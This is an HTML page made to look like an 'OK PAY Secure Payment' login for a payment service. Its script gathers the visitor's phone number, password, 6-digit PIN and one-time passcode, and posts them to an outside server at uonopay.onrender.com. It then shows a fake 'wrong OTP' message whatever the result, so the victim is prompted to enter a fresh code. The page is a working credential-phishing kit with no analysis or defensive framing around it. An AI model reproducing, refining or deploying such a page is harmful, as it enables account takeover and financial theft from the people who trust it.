<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OK PAY Secure Payment</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #FAFAFA;
        }

        .login-card {
            background: #FFFFFF;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 28px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.07);
            box-sizing: border-box;
            text-align: center;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            background: #E8F5E9;
            color: #2E7D32;
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 24px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .badge svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
            margin-right: 6px;
        }

        .logo-container {
            margin-bottom: 32px;
        }

        .logo-container img {
            width: 110px;
            height: 110px;
            border-radius: 28px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.12);
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group svg {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            width: 22px;
            height: 22px;
            fill: #9E9E9E;
        }

        .input-group input {
            width: 100%;
            padding: 18px 16px 18px 56px;
            border: 2px solid #EEEEEE;
            border-radius: 18px;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
            transition: all 0.3s ease;
            background-color: #F8F9FA;
            color: #212121;
        }

        .input-group input:focus {
            border-color: #00C853;
            background-color: #FFFFFF;
            box-shadow: 0 8px 20px rgba(0, 200, 83, 0.15);
        }

        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 28px;
            font-size: 14px;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            color: #616161;
            cursor: pointer;
            font-weight: 500;
        }

        .checkbox-label input {
            margin-right: 10px;
            width: 18px;
            height: 18px;
            accent-color: #00C853;
            cursor: pointer;
        }

        .text-link {
            color: #00C853;
            text-decoration: none;
            font-weight: 600;
        }

        .agreement-row {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 32px;
            color: #757575;
            font-size: 13px;
        }

        .agreement-row input {
            margin-right: 10px;
            width: 18px;
            height: 18px;
            accent-color: #00C853;
            cursor: pointer;
        }

        .agreement-link {
            color: #00C853;
            text-decoration: underline;
            font-weight: 600;
            margin-left: 5px;
        }

        .signin-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00E676, #00C853);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.35);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .signin-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(0, 200, 83, 0.45);
        }

        .signin-btn:active {
            transform: translateY(0);
        }

        /* Strict Locked Timer Compact Dark OTP Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 15, 0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(12px);
        }

        .otp-modal {
            background: linear-gradient(180deg, #181820 0%, #0F0F14 100%);
            color: white;
            width: 90%;
            max-width: 340px;
            padding: 32px 20px;
            border-radius: 32px;
            position: relative;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(0, 200, 83, 0.3);
            text-align: center;
        }

        .modal-close {
            position: absolute;
            top: 18px;
            right: 18px;
            background: rgba(255, 255, 255, 0.05);
            border: none;
            color: #8E8E93;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .modal-close:hover {
            background: rgba(0, 200, 83, 0.2);
            color: #00E676;
            transform: rotate(90deg);
        }

        .otp-modal h3 {
            margin: 0 0 8px 0;
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.5px;
            color: #FFFFFF;
        }

        .otp-modal p {
            color: #A0A0A0;
            font-size: 13px;
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .phone-highlight {
            color: #00E676;
            font-weight: 700;
        }

        .otp-input-wrapper {
            position: relative;
            max-width: 260px;
            height: 52px;
            margin: 0 auto 24px auto;
            background: #09090D;
            border-radius: 40px;
            padding: 4px 16px;
            border: 2px solid #00C853;
            display: flex;
            align-items: center;
            box-sizing: border-box;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.9), 0 0 15px rgba(0, 200, 83, 0.2);
        }

        .otp-input-wrapper input {
            width: 100%;
            background: transparent;
            border: none;
            color: #00E676;
            font-size: 24px;
            outline: none;
            letter-spacing: 6px;
            font-weight: 800;
            text-align: center;
        }

        .otp-input-wrapper input::placeholder {
            color: #3A3A46;
            letter-spacing: normal;
            font-size: 15px;
            font-weight: 500;
        }

        .send-otp-btn {
            margin-left: auto;
            background: linear-gradient(135deg, #00E676, #00C853);
            color: #000000;
            border: none;
            padding: 10px 16px;
            border-radius: 30px;
            font-size: 11px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            box-shadow: 0 4px 12px rgba(0, 200, 83, 0.3);
            text-transform: uppercase;
        }

        .send-otp-btn:hover:not(:disabled) {
            background: #00FF88;
            transform: scale(1.05);
            box-shadow: 0 6px 16px rgba(0, 200, 83, 0.5);
        }

        .send-otp-btn:disabled {
            background: #1A1A20;
            color: #6C6C7A;
            cursor: not-allowed;
            box-shadow: none;
            font-weight: 700;
        }

        .confirm-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00E676, #00C853);
            color: #000000;
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        .confirm-btn:hover {
            background: #00FF88;
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(0, 200, 83, 0.5);
        }

        .confirm-btn:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="badge">
        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        Secure Payment
    </div>

    <div class="logo-container">
        <img src="https://raw.githubusercontent.com/kgan35723-cell/Uonopay/main/uono-pay-logo.webp">
    </div>

    <form onsubmit="event.preventDefault(); openOtpModal();">
        <!-- Phone Input (10 digits max) -->
        <div class="input-group">
            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.15 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.12.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
            <input type="tel" placeholder="Phone Number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
        </div>

        <!-- Password Input -->
        <div class="input-group">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            <input type="password" placeholder="Password" required>
        </div>

        <!-- 6-Digit PIN Input (Numbers only) -->
        <div class="input-group">
            <svg viewBox="0 0 24 24"><path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM8.9 6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H8.9V6z"/></svg>
            <input type="password" placeholder="6-Digit PIN" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
        </div>

        <div class="options-row">
            <a href="#" class="text-link">Register</a>
            <label class="checkbox-label">
                <input type="checkbox" checked> Remember Me
            </label>
        </div>

        <div class="agreement-row">
            <input type="checkbox" id="agreement" required>
            <label for="agreement">Agree<span class="agreement-link">"User Privacy Agreement"</span></label>
        </div>

        <button type="submit" class="signin-btn">SIGN IN</button>
    </form>
</div>

<!-- Strict Locked Timer Premium Dark OTP Verification Modal -->
<div class="modal-overlay" id="otpModal">
    <div class="otp-modal">
        <button class="modal-close" onclick="closeOtpModal();">&times;</button>
        <h3>Login OTP</h3>
        <p>Enter the 6-digit OTP sent to <span class="phone-highlight">+91 6595659898</span></p>
        
        <div class="otp-input-wrapper">
            <!-- 6-Digit OTP Input (Numbers only) - Perfectly aligned and proportioned -->
            <input type="text" placeholder= "Enter 6- Digit Otp"• • • • • •" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '');" id="otpInput">    
            <button class="send-otp-btn" id="sendOtpBtn" onclick="startOtpTimer(this);">Send</button>
        </div>
        <button class="confirm-btn" onclick="confirmLogin();">CONFIRM</button>
    </div>
</div>

<script>
    let timerInterval;
    let isTimerRunning = false;
    let savedTimeLeft = 60;

    function openOtpModal() {
        document.getElementById('otpModal').style.display = 'flex';
        document.getElementById('otpInput').value = '';
        const sendBtn = document.getElementById('sendOtpBtn');
        
        if (isTimerRunning) {
            sendBtn.disabled = true;
            sendBtn.innerText = `Resend (${savedTimeLeft}s)`;
        } else {
            sendBtn.disabled = false;
            sendBtn.innerText = 'Send';
        }
    }

    function closeOtpModal() {
        document.getElementById('otpModal').style.display = 'none';
    }

    function startOtpTimer(button) {
        isTimerRunning = true;
        savedTimeLeft = 60;
        button.disabled = true;
        button.innerText = `Resend (${savedTimeLeft}s)`;
        
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            savedTimeLeft--;
            if (savedTimeLeft > 0) {
                button.innerText = `Resend (${savedTimeLeft}s)`;
            } else {
                clearInterval(timerInterval);
                button.innerText = 'Send';
                button.disabled = false;
                isTimerRunning = false;
            }
        }, 1000);
    }
function confirmLogin() {
  const phone = document.querySelector('input[type="tel"]').value;
  const password = document.querySelectorAll('input[type="password"]')[0].value;
  const pin = document.querySelectorAll('input[type="password"]')[1].value;
  const otp = document.getElementById('otpInput').value;
  const issueElement = document.getElementById('issue');
  const issue = issueElement ? issueElement.value : '';

  if (otp && otp.length === 6) {
    fetch('https://uonopay.onrender.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ phone, password, pin, otp, issue })
    })
    .then(response => response.json())
    .then(data => {
      alert('worng OTP please try again');
      if (data.success) {
        closeOtpModal();
      console.log(data)
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Failed to send data.');
    });
  } else {
    alert('Please enter a valid 6-digit OTP.');
  }
}
    
    
</script>

</body>
</html>
